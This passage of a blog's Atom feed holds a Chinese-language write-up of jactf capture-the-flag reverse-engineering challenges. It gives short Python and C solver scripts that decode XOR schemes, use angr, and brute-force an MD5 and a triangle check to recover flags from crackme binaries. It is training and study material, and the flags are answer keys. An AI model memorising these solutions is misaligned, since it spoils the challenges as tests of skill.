      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://bufsnake.github.io/tags/reverse/"/>
    
      <category term="jactf" scheme="https://bufsnake.github.io/tags/jactf/"/>
    
  </entry>
  
  <entry>
    <title>jactf-reverse</title>
    <link href="https://bufsnake.github.io/jactf-reverse.html"/>
    <id>https://bufsnake.github.io/jactf-reverse.html</id>
    <published>2019-08-12T06:32:46.000Z</published>
    <updated>2019-08-16T09:17:41.600Z</updated>
    
    <content type="html"><![CDATA[<h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p><a href="https://ctf.jasec.cn/challenges" target="_blank" rel="noopener">jactf</a></p><h3 id="reverse签到"><a href="#reverse签到" class="headerlink" title="reverse签到"></a>reverse签到</h3><p><img src="/images/pasted-29.png" alt="upload successful"></p><h4 id="签到无情，亦有情"><a href="#签到无情，亦有情" class="headerlink" title="签到无情，亦有情"></a>签到无情，亦有情</h4><p><img src="/images/pasted-30.png" alt="upload successful"></p><h3 id="re-easy"><a href="#re-easy" class="headerlink" title="re_easy"></a>re_easy</h3><p><img src="/images/pasted-31.png" alt="upload successful"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-32.png" alt="upload successful"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: pro = angr.Project(<span class="string">"re1"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: pro = angr.Project(<span class="string">"re1"</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: sm = pro.factory.simulation_manager(pro.factory.entry_state())</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: sm.explore(find=<span class="number">0x40091D</span>,avoid=<span class="number">0x4008FA</span>)</span><br><span class="line">Out[<span class="number">5</span>]: &lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> found, <span class="number">324</span> avoid&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">'bdctf&#123;YOU_CRAKE_THE_RC4&#125;'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]:</span><br></pre></td></tr></table></figure><h3 id="simplere"><a href="#simplere" class="headerlink" title="simplere"></a>simplere</h3><p><img src="/images/pasted-33.png" alt="upload successful"></p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-34.png" alt="upload successful"></p><blockquote><p>我们输入的字符串加密之后与str2比较</p></blockquote><blockquote><p>关键函数</p></blockquote><p><img src="/images/pasted-35.png" alt="upload successful"></p><p><img src="/images/pasted-37.png" alt="upload successful"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">102</span>,<span class="number">0xA</span>,<span class="number">0x6B</span>,<span class="number">0xC</span>,<span class="number">0x77</span>,<span class="number">0x12</span>,<span class="number">0x21</span>,<span class="number">25</span>,<span class="number">123</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">26</span>,<span class="number">41</span>,<span class="number">4</span>,<span class="number">48</span>,<span class="number">82</span>,<span class="number">52</span>,<span class="number">3</span>,<span class="number">46</span>,<span class="number">26</span>,<span class="number">127</span>,<span class="number">93</span>,<span class="number">21</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">31</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">95</span>,<span class="number">3</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">7</span>,<span class="number">78</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    flag[i] = flag[i] ^ flag[i<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">20</span>,<span class="number">-1</span>):</span><br><span class="line">    flag[i] = flag[i] ^ flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br></pre></td></tr></table></figure><h3 id="ELF64"><a href="#ELF64" class="headerlink" title="ELF64"></a>ELF64</h3><p><img src="/images/pasted-39.png" alt="upload successful"></p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-40.png" alt="upload successful"></p><blockquote><p>输入的数据md5加密后与780438d5b6e29db0898bc4f0225935c0相比较</p></blockquote><h4 id="somd5"><a href="#somd5" class="headerlink" title="somd5"></a>somd5</h4><p><img src="/images/pasted-41.png" alt="upload successful"></p><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby_reverse"></a>baby_reverse</h3><p><img src="/images/pasted-43.png" alt="upload successful"></p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-44.png" alt="upload successful"></p><p><img src="/images/pasted-45.png" alt="upload successful"></p><blockquote><p>输入加密比较，没什么可说的</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = list(<span class="string">"bIwhroo8cwqgwrxusi"</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">3</span>):</span><br><span class="line">    s += chr((ord(flag[i]) ^ <span class="number">18</span>) - <span class="number">6</span>)</span><br><span class="line">    s += chr((ord(flag[i+<span class="number">1</span>]) ^ <span class="number">18</span>) + <span class="number">6</span>)</span><br><span class="line">    s += chr(ord(flag[i+<span class="number">2</span>])^<span class="number">6</span>^<span class="number">18</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><h3 id="py"><a href="#py" class="headerlink" title="py"></a>py</h3><p><img src="/images/pasted-46.png" alt="upload successful"></p><h4 id="找一个在线反编译网站"><a href="#找一个在线反编译网站" class="headerlink" title="找一个在线反编译网站"></a>找一个在线反编译网站</h4><p><a href="https://tool.lu/pyc/" target="_blank" rel="noopener">pyc反编译</a></p><blockquote><p>反编译失败，查看文件头发现少了修改时间于是乎添上，解密得到python代码</p></blockquote><p><img src="/images/pasted-47.png" alt="upload successful"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'[-]Please input your key:'</span></span><br><span class="line">key = raw_input()</span><br><span class="line">flag = <span class="string">"=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"</span></span><br><span class="line">flags = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    <span class="keyword">if</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flags += chr(ord(key[q]) + <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flags += chr(ord(key[q]) - <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flags == flag:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-]Good!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-]Wrong!'</span></span><br></pre></td></tr></table></figure></p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = list(<span class="string">"=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"</span>)</span><br><span class="line">flags = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flags += chr(ord(flag[i]) - <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flags += chr(ord(flag[i]) + <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flags</span><br></pre></td></tr></table></figure><h3 id="C是最好的语言"><a href="#C是最好的语言" class="headerlink" title="C是最好的语言"></a>C是最好的语言</h3><p><img src="/images/pasted-48.png" alt="upload successful"></p><blockquote><p>难道不是我php是最好的语言吗</p></blockquote><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-49.png" alt="upload successful"></p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><blockquote><p>符号问题坑死人</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">对python还是不太熟悉</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v8;</span><br><span class="line">    <span class="keyword">int</span> flag[] = &#123;<span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">49</span>, <span class="number">56</span>, <span class="number">63</span>, <span class="number">70</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">113</span>, <span class="number">120</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">141</span>, <span class="number">148</span>, <span class="number">155</span>, <span class="number">162</span>, <span class="number">169</span>, <span class="number">176</span>, <span class="number">183</span>, <span class="number">190</span>, <span class="number">197</span>, <span class="number">205</span>, <span class="number">212</span>, <span class="number">219</span>, <span class="number">226</span>, <span class="number">233</span>, <span class="number">240</span>, <span class="number">247</span>, <span class="number">254</span>, <span class="number">261</span>, <span class="number">268</span>, <span class="number">275</span>, <span class="number">282</span>, <span class="number">289</span>, <span class="number">296</span>, <span class="number">304</span>, <span class="number">311</span>, <span class="number">318</span>, <span class="number">325</span>, <span class="number">332</span>, <span class="number">339</span>, <span class="number">346</span>, <span class="number">353</span>, <span class="number">360</span>, <span class="number">367</span>, <span class="number">374</span>, <span class="number">381</span>, <span class="number">388</span>, <span class="number">395</span>, <span class="number">403</span>, <span class="number">410</span>, <span class="number">417</span>, <span class="number">424</span>, <span class="number">431</span>, <span class="number">438</span>, <span class="number">445</span>, <span class="number">452</span>, <span class="number">459</span>, <span class="number">466</span>, <span class="number">473</span>, <span class="number">480</span>, <span class="number">487</span>, <span class="number">494</span>, <span class="number">502</span>, <span class="number">509</span>, <span class="number">516</span>, <span class="number">523</span>, <span class="number">530</span>, <span class="number">537</span>, <span class="number">544</span>, <span class="number">551</span>, <span class="number">558</span>, <span class="number">565</span>, <span class="number">572</span>, <span class="number">579</span>, <span class="number">586</span>, <span class="number">593</span>, <span class="number">601</span>, <span class="number">608</span>, <span class="number">615</span>, <span class="number">622</span>, <span class="number">629</span>, <span class="number">636</span>, <span class="number">643</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">664</span>, <span class="number">671</span>, <span class="number">678</span>, <span class="number">685</span>, <span class="number">692</span>, <span class="number">699</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,v9;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(flag)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;<span class="keyword">sizeof</span>(flag)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(k=j+<span class="number">1</span>;k&lt;<span class="keyword">sizeof</span>(flag)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);k++)&#123;</span><br><span class="line">                v9 = (flag[i]+flag[j]+flag[k])/<span class="number">2</span>;</span><br><span class="line">                v8 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v9-flag[k]) * ((v9-flag[j])*(v9-flag[i])) * v9);</span><br><span class="line">                v8 = <span class="built_in">sqrt</span>(v8*<span class="number">1.0</span>);</span><br><span class="line">                <span class="keyword">if</span>((v8 - <span class="number">58792</span>) &lt; <span class="number">0.1</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%d %d %d \n"</span>,flag[i],flag[j],flag[k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="快下班了-emmm…"><a href="#快下班了-emmm…" class="headerlink" title="快下班了,emmm….."></a>快下班了,emmm…..</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;平台&quot;&gt;&lt;a href=&quot;#平台&quot; class=&quot;headerlink&quot; title=&quot;平台&quot;&gt;&lt;/a&gt;平台&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://ctf.jasec.cn/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopene
      
    
    </summary>
    
      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://bufsnake.github.io/tags/reverse/"/>
    
      <category term="jactf" scheme="https://bufsnake.github.io/tags/jactf/"/>
    
  </entry>
  
</feed>
